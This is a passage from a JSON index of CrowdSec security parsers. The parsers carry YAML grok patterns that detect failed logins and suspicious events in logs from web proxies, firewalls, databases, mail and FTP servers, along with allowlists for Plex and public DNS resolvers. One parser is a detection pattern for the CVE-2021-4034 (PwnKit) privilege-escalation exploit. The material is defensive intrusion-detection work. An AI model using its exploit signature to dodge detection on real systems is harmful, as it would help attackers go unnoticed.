evt.Parsed.time_local\n  # and this one the error log\n  - grok:\n        pattern: '(%{IPORHOST:target_fqdn} )?%{NGINXERRTIME:time} \\[%{LOGLEVEL:loglevel}\\] %{NONNEGINT:pid}#%{NONNEGINT:tid}: (\\*%{NONNEGINT:cid} )?%{GREEDYDATA:message}, client: %{IPORHOST:remote_addr}, server: %{IPORHOST:target_fqdn}, request: \"%{WORD:verb} %{URIPATHPARAM:request} HTTP/%{NUMBER:http_version}\", host: \"%{IPORHOST}\"'\n        apply_on: message\n        statics:\n          - meta: log_type\n            value: http_error-log\n          - target: evt.StrTime\n            expression: evt.Parsed.time\n    onsuccess: next_stage\n    nodes:\n      - filter: \"evt.Parsed.message contains 'was not found in'\"\n        grok:\n          pattern: '%{USER_NOT_FOUND}'\n          apply_on: message\n        statics:\n          - meta: sub_type\n            value: \"auth_fail\"\n          - meta: username\n            expression: evt.Parsed.username\n      - filter: \"evt.Parsed.message contains 'password mismatch'\"\n        grok:\n          pattern: '%{PASSWORD_MISMATCH}'\n          apply_on: message\n        statics:\n          - meta: sub_type\n            value: \"auth_fail\"\n          - meta: username\n            expression: evt.Parsed.username\n# Parse malformed requests\n  - grok:\n      pattern: '(%{IPORHOST:target_fqdn} )?%{IPORHOST:remote_addr} - (%{NGUSER:remote_user})? \\[%{HTTPDATE:time_local}\\] \"%{DATA:request}\" %{NUMBER:status} %{NUMBER:body_bytes_sent} \"%{NOTDQUOTE:http_referer}\" \"%{NOTDQUOTE:http_user_agent}\"( %{NUMBER:request_length} %{NUMBER:request_time} \\[%{DATA:proxy_upstream_name}\\] \\[%{DATA:proxy_alternative_upstream_name}\\])?'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: http_access-log\n        - target: evt.StrTime\n          expression: evt.Parsed.time_local\n# these ones apply for both grok patterns\nstatics:\n  - meta: service\n    value: http\n  - meta: source_ip\n    expression: \"evt.Parsed.remote_addr\"\n  - meta: http_status\n    expression: \"evt.Parsed.status\"\n  - meta: http_path\n    expression: \"evt.Parsed.request\"\n  - meta: http_verb\n    expression: \"evt.Parsed.verb\"\n  - meta: http_user_agent\n    expression: \"evt.Parsed.http_user_agent\"\n  - meta: target_fqdn\n    expression: \"evt.Parsed.target_fqdn\"\n", "description": "Parse Nginx Proxy Manager access and error logs", "path": "parsers/s01-parse/crowdsecurity/nginx-proxy-manager-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "d3537478fca875fdaccc3d5591ec3ce3f6fbeb5283737aca3b12d322bd8abfd7"}, "0.2": {"digest": "b3c98501a460913b0d09aaf410e5651e999eba720516bb4822e69f0adea19685"}, "0.3": {"digest": "e3a539c36cd1445c365c70a4ebd1222e26fdcdc57a5af040969f71f688490b93"}, "0.4": {"digest": "202d34eb20732475c05b67ee8da2525de5d4e35a839b3d917e6968bab510ab4d"}}}, "crowdsecurity/odoo-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/odoo-logs\ndescription: \"Parse Odoo logs\"\nfilter: \"evt.Parsed.program == 'odoo'\"\nnodes:\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:timestamp} %{INT:PID} INFO %{DATA:db_name} odoo.addons.base.models.res_users: Login failed for db:%{DATA} login:%{DATA:user} from %{IP:source_ip}'\n      apply_on: message\nstatics:\n  - meta: log_type\n    value: odoo_failed_auth\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: user\n    expression: \"evt.Parsed.user\"\n  - meta: db\n    expression: \"evt.Parsed.db_name\"\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp", "description": "Parse Odoo logs", "path": "parsers/s01-parse/crowdsecurity/odoo-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "a41a81ec54fd61070c0d15f954a4a6f00c63e33546f12d79c6abaf745c36fb4e"}}}, "crowdsecurity/opnsense-gui-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'audit'\"\nname: crowdsecurity/opnsense-gui-logs\ndescription: \"Parse OPNSense web auth logs\"\n#/index.php: Web GUI authentication error for 'toto' from 1.2.3.4\ngrok: \n  pattern: \"/index.php: Web GUI authentication error for '%{USERNAME:username}' from %{IPORHOST:source_ip}\"\n  apply_on: message\nstatics:\n  - meta: service\n    value: opnsense-gui\n  - meta: username\n    expression: \"evt.Parsed.username\"\n  - meta: source_ip\n    expression: evt.Parsed.source_ip\n  - meta: log_type\n    value: opnsense-gui-failed-auth\n", "description": "Parse OPNSense web auth logs", "path": "parsers/s01-parse/crowdsecurity/opnsense-gui-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "1a93083832b2ef50845cbf1fd056ab1b680e6f524d17892bc8f6cb72cfe87935"}}}, "crowdsecurity/palo-alto-threat-log": {"content": "onsuccess: next_stage\nname: crowdsecurity/palo-alto-threat-log\ndescription: \"Parse palo-alto-threat-log logs\"\nfilter: \"evt.Parsed.program == 'palo-alto-threat'\"\npattern_syntax:\n  PAN_TIMESTAMP: \"%{YEAR}/%{MONTHNUM}/%{MONTHDAY} %{HOUR}:%{MINUTE}:%{INT}\"\nnodes:\n  - grok:\n      pattern: '(%{TIMESTAMP_ISO8601:syslog_timestamp} )?%{SYSLOGHOST:syslog_hostname} %{DATA:pan_reserved},%{DATA},%{WORD:serial_number},%{WORD:log_type},%{WORD:log_subtype},%{DATA:pan_unknown},%{PAN_TIMESTAMP:generation_timestamp},%{IP:src_ip},%{IP:dst_ip},%{IP:nat_src_ip},%{IP:nat_dst_ip},%{DATA:rule},%{DATA:src_user},%{DATA:dst_user},%{DATA:app},%{DATA:vsys},%{DATA:src_zone},%{DATA:dst_zone},%{DATA:ingress_int},%{DATA:egress_int},%{DATA:log_fwd_profile},%{DATA},%{DATA:session_id},%{DATA:repeat_count},%{DATA:src_port},%{DATA:dst_port},%{DATA:nat_src_port},%{DATA:nat_dst_port},%{DATA:pan_log_flags},%{DATA:ip_proto},%{DATA:action},(\"%{DATA:url_or_filename}\")?,%{DATA:threat_id},%{DATA:url_category_or_wildfire_verdict},%{DATA:severity},%{DATA:direction},%{DATA:log_seq_num},%{DATA:fwd_to_panorama},%{DATA:src_country},%{DATA:dst_country},%{DATA:http_content_type},%{DATA:pcap_id},%{DATA:file_hash},%{DATA:wildfire_server},%{GREEDYDATA:unparsed_data}'\n      apply_on: message\nstatics:\n  - target: evt.StrTime\n    expression: evt.Parsed.syslog_timestamp\n  - meta: log_type\n    value: palo_alto\n  - meta: source_ip\n    expression: evt.Parsed.src_ip\n  - meta: severity\n    expression: evt.Parsed.severity\n  - meta: threat_id\n    expression: evt.Parsed.threat_id\n  - meta: destination_location\n    expression: evt.Parsed.dst_country\n  - meta: source_location\n    expression: evt.Parsed.src_country\n  - meta: rule_name\n    expression: evt.Parsed.rule\n  - meta: application\n    expression: evt.Parsed.app\n  - meta: threat_type\n    expression: evt.Parsed.threat_id\n", "description": "Parse palo-alto-threat-log logs", "path": "parsers/s01-parse/crowdsecurity/palo-alto-threat-log.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "7a9d62f00f202417325dcfac25efc34e5caaa78b469486977967ced0d0ec6cb1"}, "0.2": {"digest": "8e2ef39c33263f3b2bdca6e6936a61de1a84a4bc7ad741626b31b9f19d2304b7"}, "0.3": {"digest": "a2f3c15040301cdbbf75233c123d089be2380401de5f335b08275929a2f45974"}}}, "crowdsecurity/pam-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'sudo'\"\nname: crowdsecurity/pam-logs\ndescription: \"Parse pam logs\"\nnodes:\n  - grok: \n      pattern: 'pam_tally2\\(sudo:auth\\): user %{NOTSPACE:username} \\(%{NUMBER:uid}\\) tally \\d, deny \\d'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: pam_user_lock\n  - grok:\n      pattern: 'pam_unix\\(sudo:auth\\): authentication failure; logname=%{NOTSPACE:logname} uid=%{NUMBER:uid} euid=%{NUMBER:euid} tty=%{NOTSPACE:tty} ruser=%{NOTSPACE:ruser} rhost=%{GREEDYDATA:rhost}  user=%{NOTSPACE:username}'\n      apply_on: message\n      statics:\n        - meta: log_type\n          value: pam_failed_auth\nstatics:\n  - meta: service\n    value: pam\n  - meta: username\n    expression: \"evt.Parsed.username\"\n", "description": "Parse pam logs", "path": "parsers/s01-parse/crowdsecurity/pam-logs.yaml", "stage": "s01-parse", "version": "0.2", "versions": {"0.1": {"digest": "8648ee68511e7f48834a7e4a2c850f55de13ebcf05cb97b147265290ec089384"}, "0.2": {"digest": "7fc970165bfb774accdf27c4932473bd2633cc680d213ed49656e4f462fdd495"}}}, "crowdsecurity/pfsense-gui-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program == 'php-fpm'\"\nname: crowdsecurity/pfsense-gui-logs\ndescription: \"Parse pfSense web auth logs\"\ngrok: \n  pattern: \"/index.php: webConfigurator authentication error for user '%{USERNAME:username}' from: %{IPORHOST:source_ip}\"\n  apply_on: message\nstatics:\n  - meta: service\n    value: pfsense-gui\n  - meta: username\n    expression: \"evt.Parsed.username\"\n  - meta: source_ip\n    expression: evt.Parsed.source_ip\n  - meta: log_type\n    value: pfsense-gui-failed-auth\n", "description": "Parse pfSense web auth logs", "path": "parsers/s01-parse/crowdsecurity/pfsense-gui-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "0e759d86c5244f6593c6ba58f18d59ad1fac1fe9cc2f127053f229d4851f57f4"}}}, "crowdsecurity/pgsql-logs": {"content": "onsuccess: next_stage\nname: crowdsecurity/pgsql-logs\ndescription: \"Parse PgSQL logs\"\nfilter: \"evt.Parsed.program == 'postgres'\"\nnodes:\n  - grok:\n    #pgsql 12\n      pattern: '%{DATESTAMP:timestamp} %{WORD:zone} \\[%{INT:PID}\\] %{IP:source_ip} %{USERNAME:pgsql_user}@%{GREEDYDATA:pgsql_dbname} FATAL:  %{WORD:auth_method} authentication failed for user \"%{USERNAME:pgsql_target_user}\"'\n      apply_on: message\n  - grok:\n    #aws aurora\n    #%{DATESTAMP:timestamp} %{WORD:zone}:%{IP:source_ip}\\(%{INT:source_port}\\):%{USERNAME:pgsql_user}@%{GREEDYDATA:pgsql_dbname}:\\[%{INT:pid}\\]:FATAL: password authentication failed for user \"%{USERNAME:pgsql_target_user}\"\n      pattern: '%{DATESTAMP:timestamp} %{WORD:zone}:%{IP:source_ip}\\(%{INT:source_port}\\):%{USERNAME:pgsql_user}@%{GREEDYDATA:pgsql_dbname}:\\[%{INT:pid}\\]:FATAL:  %{WORD:auth_method} authentication failed for user \"%{USERNAME:pgsql_target_user}\"'\n      apply_on: message\nstatics:\n  - meta: log_type\n    value: pgsql_failed_auth\n  - meta: auth_method\n    expression: \"evt.Parsed.auth_method\"\n  - meta: source_ip\n    expression: \"evt.Parsed.source_ip\"\n  - meta: user\n    expression: \"evt.Parsed.pgsql_target_user\"\n  - meta: db\n    expression: \"evt.Parsed.pgsql_dbname\"\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp", "description": "Parse PgSQL logs", "path": "parsers/s01-parse/crowdsecurity/pgsql-logs.yaml", "stage": "s01-parse", "version": "0.7", "versions": {"0.1": {"digest": "180dbffa0ae9a0b7fa192d5328dfc69c8b1a0489a81604c6642a47be3fd1394d"}, "0.2": {"digest": "bf228d679c51e8b47d06ee58185591b97c5be3acb4fcb0e38d36707f6452bd5d"}, "0.3": {"digest": "693c053d3ff524e84e2aea4d4e29d0fc2b8151804d4672f7cbdf77d8ac48eccc"}, "0.4": {"digest": "107048061794ca54bf99a080d78642a1345cc9d5554bc54bad353aec3fa313d0"}, "0.5": {"digest": "70c79e6c9c679779cd61bad22760bc0ac421b6a735278d659dec3b39c85f15f2"}, "0.6": {"digest": "9492516f5fce0c7a6b620efab95dc8679486bb2c5f4175012514ec09eabbf7f1"}, "0.7": {"digest": "70c79e6c9c679779cd61bad22760bc0ac421b6a735278d659dec3b39c85f15f2"}}}, "crowdsecurity/pkexec-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'pkexec'\"\nname: crowdsecurity/pkexec-logs\ndescription: \"Parse pkexec logs specifically for CVE-2021-4034\"\npattern_syntax:\n  PWNKIT_XPL: '%{DATA:user}: The value for the SHELL variable was not found the /etc/shells file'\ngrok:\n  name: \"PWNKIT_XPL\"\n  apply_on: message\nstatics:\n  - meta: log_type\n    value: CVE-2021-4034-xpl\n  - meta: target_user\n    expression: \"evt.Parsed.user\"\n", "description": "Parse pkexec logs specifically for CVE-2021-4034", "path": "parsers/s01-parse/crowdsecurity/pkexec-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "3b8e30530f69f776d327b5710653a496245949ca6dde84d16357f433b7303a25"}}}, "crowdsecurity/plex-allowlist": {"content": "name: crowdsecurity/plex-allowlist\ndescription: \"Allowlist events from Plex\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']\"\nwhitelist:\n  reason: \"Plex Allowlist\"\n  expression:\n   - evt.Meta.http_status in ['200', '404'] && evt.Meta.http_verb == 'GET' && evt.Meta.http_path startsWith '/video/:/transcode/'\n   - evt.Meta.http_status == '200' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path startsWith '/photo/:/transcode/'\n   - evt.Meta.http_status in ['200', '400'] && evt.Meta.http_verb == 'GET' && evt.Meta.http_path startsWith '/:/timeline'\n   - evt.Meta.http_status == '200' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path matches '^/library/metadata/\\\\d+'\n   - evt.Meta.http_status == '200' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path == '/status/sessions'\n   - evt.Meta.http_status == '404' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path startsWith '/playQueues/'\n   - evt.Meta.http_status == '403' && evt.Meta.http_verb == 'POST' && evt.Parsed.request == '/log' && evt.Parsed.http_args contains 'X-Plex-Product=Plex%20Cast&X-Plex-Version='\n   - evt.Meta.http_status == '200' && evt.Meta.http_verb == 'GET' && evt.Meta.http_path startsWith '/music/:/transcode/universal/session/'\n", "description": "Allowlist events from Plex", "path": "parsers/s02-enrich/crowdsecurity/plex-allowlist.yaml", "stage": "s02-enrich", "version": "0.2", "versions": {"0.1": {"digest": "38c6b298e8358e7d15145f9d34e1720596850342c705aa57e4764ccdf551bca4"}, "0.2": {"digest": "ba4339d92d29c1764f7f77e4dd24f08bda7c477b1448299cb73a9d1ef848931d"}}}, "crowdsecurity/postfix-logs": {"content": "# Copyright (c) 2014, 2015, Rudy Gevaert\n# Copyright (c) 2020 Crowdsec\n\n# Permission is hereby granted, free of charge, to any person obtaining\n# a copy of this software and associated documentation files (the\n# \"Software\"), to deal in the Software without restriction, including\n# without limitation the rights to use, copy, modify, merge, publish,\n# distribute, sublicense, and/or sell copies of the Software, and to\n# permit persons to whom the Software is furnished to do so, subject to\n# the following conditions:\n\n# The above copyright notice and this permission notice shall be\n# included in all copies or substantial portions of the Software.\n\n# THE SOFTWARE IS PROVIDED \"AS IS\", WITHOUT WARRANTY OF ANY KIND,\n# EXPRESS OR IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF\n# MERCHANTABILITY, FITNESS FOR A PARTICULAR PURPOSE AND\n# NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR COPYRIGHT HOLDERS BE\n# LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER IN AN ACTION\n# OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN CONNECTION\n# WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.\n\n# Some of the groks used here are from https://github.com/rgevaert/grok-patterns/blob/master/grok.d/postfix_patterns\nonsuccess: next_stage\nfilter: \"evt.Parsed.program endsWith '/smtpd'\"\nname: crowdsecurity/postfix-logs\npattern_syntax:\n  POSTFIX_HOSTNAME: '(%{HOSTNAME}|unknown)'\n  POSTFIX_COMMAND: '(AUTH|STARTTLS|CONNECT|EHLO|HELO|RCPT)'\n  POSTFIX_ACTION: 'discard|dunno|filter|hold|ignore|info|prepend|redirect|replace|reject|warn'\n  RELAY: '(?:%{HOSTNAME:remote_host}(?:\\[%{IP:remote_addr}\\](?::[0-9]+(.[0-9]+)?)?)?)'\n  SMTP_BASIC_STATUS_CODE: '[0-9]{3}' #250\n  SMTP_ENHANCED_STATUS_CODE: '[0-9.]+' #2.0.0\n  SMTP_RETURN_CODES: '%{SMTP_BASIC_STATUS_CODE:smtp_basic_status_code}( %{SMTP_ENHANCED_STATUS_CODE:smtp_enhanced_status_code})?' #250 2.0.0\ndescription: \"Parse postfix logs\"\nnodes:\n  - grok:\n      apply_on: message\n      pattern: 'lost connection after %{DATA:smtp_response} from %{RELAY}'\n      statics:\n        - meta: log_type_enh\n          value: spam-attempt\n  - grok:\n      apply_on: message\n      pattern: 'warning: %{POSTFIX_HOSTNAME:remote_host}\\[%{IP:remote_addr}\\]: SASL ((?i)LOGIN|PLAIN|(?:CRAM|DIGEST)-MD5) authentication failed:%{GREEDYDATA:message_failure}'\n      statics:\n        - meta: log_type_enh\n          value: spam-attempt\n  - grok:\n      apply_on: message\n      pattern: 'warning: non-SMTP command from %{POSTFIX_HOSTNAME:remote_host}\\[%{IP:remote_addr}\\]: %{GREEDYDATA:command}'\n      statics:\n        - meta: log_type_enh\n          value: non-smtp-command\n  - grok:\n      apply_on: message\n      pattern: 'NOQUEUE: %{POSTFIX_ACTION:action}: %{DATA:command} from %{RELAY}: %{SMTP_RETURN_CODES:smtp_return_codes} %{GREEDYDATA:reason}'\n      statics:\n        - meta: action\n          expression: \"evt.Parsed.action\"\n    nodes:\n      ## We check if the reason is not a service unavailable if so we parser more information\n      - filter: \"evt.Parsed.reason != 'Service unavailable'\"\n        grok:\n          apply_on: reason\n          pattern: \"<%{DATA:helo}>: %{GREEDYDATA:reason}; %{GREEDYDATA:kvItems}\"\n        statics:\n          - parsed: unused\n            expression: ParseKV(evt.Parsed.kvItems, evt.Unmarshaled, \"postfix\")\n          - meta: reason\n            expression: \"evt.Parsed.reason\"\nstatics:\n    - meta: service\n      value: postfix\n    - meta: source_ip\n      expression: \"evt.Parsed.remote_addr\"\n    - meta: source_hostname\n      expression: \"evt.Parsed.remote_host\"\n    - meta: log_type\n      value: postfix\n\n", "description": "Parse postfix logs", "path": "parsers/s01-parse/crowdsecurity/postfix-logs.yaml", "stage": "s01-parse", "version": "0.9", "versions": {"0.1": {"digest": "da6b8ecae70e951905697c92fc0c198c2148041bf96e33658d485818c37d7414"}, "0.2": {"digest": "7338524c5cd363792ee2b8edd488ee6e855b925e073ad659ae2c1b9fb1f4afdf"}, "0.3": {"digest": "22d3fd0f7d3ca3ea1899df909c5748ed8781b58d243e8d54217ce268874072e1"}, "0.4": {"digest": "1b30aa19109f2f95ac96afa38e83d5abea3ace8b310773cf936e7191241a01df"}, "0.5": {"digest": "dc61094384986837e4096f8490a4ba692624a4515540f17c8cf030afed470fb7"}, "0.6": {"digest": "3bfd0f21a91cdee11ef4c03ae617fcd5b43967dcfc5f13592be637a4c8bf2b1f"}, "0.7": {"digest": "69418bc0ba6fb999af9c2e0a4e23848836ec664a646adaa14cf64763364a8846"}, "0.8": {"digest": "aef338766b7b740ae4421f325e7d64ad608b3e79069c2fb3956336181d6aaabb"}, "0.9": {"digest": "e2244e80994075640c865a395975880d19140c39d96e73d34034f7b6f3e9d4e4"}}}, "crowdsecurity/postscreen-logs": {"content": "onsuccess: next_stage\nfilter: \"evt.Parsed.program in ['postfix/postscreen', 'haproxy/postscreen']\"\nname: crowdsecurity/postscreen-logs\npattern_syntax:\n  POSTSCREEN_PREGREET: 'PREGREET'\n  POSTSCREEN_PREGREET_TIME_ATTEMPT: '\\d+(.\\d+)?'\ndescription: \"Parse postscreen logs\"\nnodes:\n  - grok:\n      apply_on: message\n      pattern: '%{POSTSCREEN_PREGREET:pregreet} %{INT:count} after %{POSTSCREEN_PREGREET_TIME_ATTEMPT:time_attempt} from \\[%{IP:remote_addr}\\]:%{INT:port}: %{GREEDYDATA:message_attempt}'\nstatics:\n    - meta: service\n      value: postscreen\n    - meta: source_ip\n      expression: \"evt.Parsed.remote_addr\"\n    - meta: pregreet\n      expression: \"evt.Parsed.pregreet\"\n\n\n", "description": "Parse postscreen logs", "path": "parsers/s01-parse/crowdsecurity/postscreen-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "5ee035d47824573e19f9a1d378d8882cf3efa72f6443e2243f915d6b38b4b957"}, "0.2": {"digest": "4a738f39e310daafeabf599f9bdbee013178aae5a1ca9da4f4985ae1626a0e21"}, "0.3": {"digest": "9ce070163edf33d430b5332f196a75fb39871507cd97a5942177af163ad58e98"}}}, "crowdsecurity/proftpd-logs": {"content": "onsuccess: next_stage\nname: proftpd-logs\ndescription: \"Parse proftpd logs\"\nfilter: \"evt.Parsed.program == 'proftpd'\"\n#we should use the same pattern for \"normal\" and plesk logs, but due to an issue in grokky handling (), we cannot :(\npattern_syntax:\n  PROFTPD_AUTH_FAIL: '%{TIMESTAMP_ISO8601:timestamp} %{IPORHOST:hostname} proftpd\\[%{DATA}\\] %{IPORHOST:hostname} \\(%{IPORHOST}\\[%{IP:source_ip}\\]\\): USER %{USERNAME:username} \\(Login failed\\): Incorrect password'\n  PROFTPD_BAD_USER: '%{TIMESTAMP_ISO8601:timestamp} %{IPORHOST:hostname} proftpd\\[%{DATA}\\] %{IPORHOST:hostname} \\(%{IPORHOST}\\[%{IP:source_ip}\\]\\): USER %{USERNAME:username}( \\(Login failed\\))?: (n|N)o such user found( from %{IPORHOST} \\[%{IPORHOST}\\] to %{IPORHOST}:%{DATA:port})?'\n  PROFTPD_AUTH_FAIL_PLESK: '%{SYSLOGTIMESTAMP:timestamp} %{IPORHOST:hostname} proftpd\\[%{DATA}\\]: %{IPORHOST:hostname} \\(%{IPORHOST}\\[%{IP:source_ip}\\]\\) - USER %{USERNAME:username} \\(Login failed\\): Incorrect password'\n  PROFTPD_BAD_USER_PLESK: '%{SYSLOGTIMESTAMP:timestamp} %{IPORHOST:hostname} proftpd\\[%{DATA}\\]: %{IPORHOST:hostname} \\(%{IPORHOST}\\[%{IP:source_ip}\\]\\) - USER %{USERNAME:username}( \\(Login failed\\))?: (n|N)o such user found( from %{IPORHOST} \\[%{IPORHOST}\\] to %{IPORHOST}:%{DATA:port})?'\nnodes:\n  - grok:\n      pattern: \"%{PROFTPD_AUTH_FAIL}\"\n      apply_on: message\n  - grok:\n      pattern: \"%{PROFTPD_BAD_USER}\"\n      apply_on: message\n  - grok:\n      pattern: \"%{PROFTPD_AUTH_FAIL_PLESK}\"\n      apply_on: message\n  - grok:\n      pattern: \"%{PROFTPD_BAD_USER_PLESK}\"\n      apply_on: message\nstatics:\n    - meta: log_type\n      value: ftp_failed_auth\n    - meta: source_ip\n      expression: \"evt.Parsed.source_ip\"\n    - meta: target_user\n      expression: \"evt.Parsed.username\"\n    - target: evt.StrTime\n      expression: evt.Parsed.timestamp ", "description": "Parse proftpd logs", "path": "parsers/s01-parse/crowdsecurity/proftpd-logs.yaml", "stage": "s01-parse", "version": "0.3", "versions": {"0.1": {"digest": "f00e26a5fd74f57bab31f930d23cca9c2ede7cc480cb34c7a6aef5a87baf0ca0"}, "0.2": {"digest": "9921d4752e7337533472031d1495f9c4e4f870a558ea48f303e95e96a31f7f13"}, "0.3": {"digest": "7121c527184caecbc3ca675ba5bc1c7e2029b6f4c625dcbff6c294a22c3d3274"}}}, "crowdsecurity/public-dns-allowlist": {"content": "name: crowdsecurity/public-dns-allowlist\ndescription: \"Allow events from public DNS servers\"\nwhitelist:\n  reason: \"public DNS server\"\n  ip:\n    # cloudflare\n    - 1.1.1.1\n    - 1.0.0.1\n    - \"2606:4700:4700::1111\"\n    - \"2606:4700:4700::1001\"\n    # google\n    - 8.8.8.8\n    - 8.8.4.4\n    - \"2001:4860:4860::8888\"\n    - \"2001:4860:4860::8844\"\n    #quad9\n    - 9.9.9.9\n    - 149.112.112.112\n    - \"2620:fe::fe\"\n    - \"2620:fe::9\"\n    - 9.9.9.11\n    - 149.112.112.11\n    - \"2620:fe::11\"\n    - \"2620:fe::fe:11\"\n    - 9.9.9.10\n    - 149.112.112.10\n    - \"2620:fe::10\"\n    - \"2620:fe::fe:10\"\n    # cleanbrowsing\n    - 185.228.168.168\n    - 185.228.169.168\n    - \"2a0d:2a00:1::\"\n    - \"2a0d:2a00:2::\"\n    # alternate DNS\n    - 76.76.19.19\n    - 76.223.122.150\n    - \"2602:fcbc::ad\"\n    - \"2602:fcbc:2::ad\"\n    # adguard\n    - 94.140.14.14\n    - 94.140.15.15\n    - 94.140.14.140\n    - 94.140.14.141\n    - 94.140.14.15\n    - 94.140.15.16\n    - \"2a10:50c0::ad1:ff\"\n    - \"2a10:50c0::ad2:ff\"\n    - \"2a10:50c0::1:ff\"\n    - \"2a10:50c0::2:ff\"\n    - \"2a10:50c0::bad1:ff\"\n    - \"2a10:50c0::bad2:ff\"\n    # OpenDNS\n    - 208.67.222.222\n    - 208.67.220.220\n    - 208.67.222.123\n    - 208.67.220.123\n    - 208.67.220.2\n    - 208.67.222.2\n    - \"2620:119:35::35\"\n    - \"2620:119:53::53\"\n    - \"2620:119:35::123\"\n    - \"2620:119:53::123\"\n    - \"2620:0:ccd::2\"\n    - \"2620:0:ccc::2\"\n  cidr:\n    # control D\n    - 76.76.2.0/24\n    - 76.76.10.0/24\n    - \"2606:1a40::/48\"\n    - \"2606:1a40:1::/48\"\n", "description": "Allow events from public DNS servers", "path": "parsers/s02-enrich/crowdsecurity/public-dns-allowlist.yaml", "stage": "s02-enrich", "version": "0.1", "versions": {"0.1": {"digest": "b563435e1b9bb0568f1716320ddb061d2fa9f38cb1cbabe9e4c6372fd6f6ce0e"}}}, "crowdsecurity/rocketchat-whitelist": {"content": "name: crowdsecurity/rocketchat-whitelist\ndescription: \"Whitelist events from rocketchat\"\nfilter: \"evt.Meta.service == 'http' && evt.Meta.log_type in ['http_access-log', 'http_error-log']\"\nwhitelist:\n  reason: \"RocketChat Whitelist\"\n  expression:\n   - evt.Meta.http_status in ['200', '304'] && evt.Meta.http_verb == 'GET' && evt.Meta.http_path startsWith '/avatar/'", "description": "Whitelist events from rocketchat", "path": "parsers/s02-enrich/crowdsecurity/rocketchat-whitelist.yaml", "stage": "s02-enrich", "version": "0.1", "versions": {"0.1": {"digest": "26aeee91174be9003162094d172b8c5673cab972839264cbd22648c8786acfcb"}}}, "crowdsecurity/sabnzbd-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'sabnzbd'\"\nname: crowdsecurity/sabnzbd-logs\ndescription: \"Parse sabnzbd authentication failures\"\npattern_syntax:\n  SABNZBD_TIMESTAMP: '%{SYSLOGTIMESTAMP:timestamp}'\n  SABNZBD_SUFFIX: '( \\(X-Forwarded-For: %{IP:first_forwarded}.*\\))? \\[%{GREEDYDATA:user_agent}\\]'\nnodes:\n  - grok:\n      pattern: '%{TIMESTAMP_ISO8601:timestamp}::%{DATA:log_level}::\\[%{DATA}:%{INT:pid}\\] %{GREEDYDATA:sabnzbd_message}'\n      apply_on: message\n    nodes:\n      - grok:\n          pattern: 'Unsuccessful login attempt from %{IP:first_ip}%{SABNZBD_SUFFIX}'\n          apply_on: sabnzbd_message\n          statics:\n            - meta: log_type\n              value: sabnzbd_failed_auth\n      - grok:\n          pattern: 'Fehlerhafter Login Versuch von %{IP:first_ip}%{SABNZBD_SUFFIX}'\n          apply_on: sabnzbd_message\n          statics:\n            - meta: log_type\n              value: sabnzbd_failed_auth\n      - grok:\n          pattern: 'Echec de la tentative de connexion de %{IP:first_ip}%{SABNZBD_SUFFIX}'\n          apply_on: sabnzbd_message\n          statics:\n            - meta: log_type\n              value: sabnzbd_failed_auth\n      - grok:\n          pattern: 'Mislukte login poging van %{IP:first_ip}%{SABNZBD_SUFFIX}'\n          apply_on: sabnzbd_message\n          statics:\n            - meta: log_type\n              value: sabnzbd_failed_auth\n\nstatics:\n  - meta: service\n    value: sabnzbd\n  - target: evt.StrTime\n    expression: evt.Parsed.timestamp\n  - meta: source_ip\n    expression: \"evt.Parsed.first_forwarded != '' ? evt.Parsed.first_forwarded : evt.Parsed.first_ip\"\n", "description": "Parse sabnzbd authentication failures", "path": "parsers/s01-parse/crowdsecurity/sabnzbd-logs.yaml", "stage": "s01-parse", "version": "0.1", "versions": {"0.1": {"digest": "2771370828fb3f3abf7de04715e49465e9bcbf58c2d5698ac162bdfbd6172328"}}}, "crowdsecurity/segfault-logs": {"content": "onsuccess: next_stage\n#debug: true\nfilter: \"evt.Parsed.program == 'kernel' and evt.Parsed.message contains 'segfault'\"\nname: crowdsecurity/segfault-logs\nnodes:\n- grok:\n    pattern: '(\\[%{DATA}\\] )?%{DATA:binary}\\[%{INT:pid}\\]: segfault at %{DATA:addr} ip %{DATA:rip} sp %{DATA:sp} error %{INT:err_num} in %{DATA:library}\\[%{DATA:library_offset}\\]( %{DATA})?'\n    apply_on: message\ndescription: \"Parses segfault kernel side\"\nstatics:\n  - meta: log_type\n    value: kernel\n  - meta: sub_log_type\n    value: segfault\n  - meta: library\n    expression: evt.Parsed.library\n  - meta: errnum\n    expression: evt.Parsed.errnum\n  - meta: binary\n    expression: evt.Parsed.binary\n", "description": "Parses segfault kernel side", "path": "parsers/s01-parse/crowdsecurity/segfault-logs.yaml", "stage": "s01-parse", "version": "0.4", "versions": {"0.1": {"digest": "9079d38e296e0b574a5cb2fe1fee614c08114912daefa569b2dc0648d8d8e8b8"}, "0.2": {"digest": 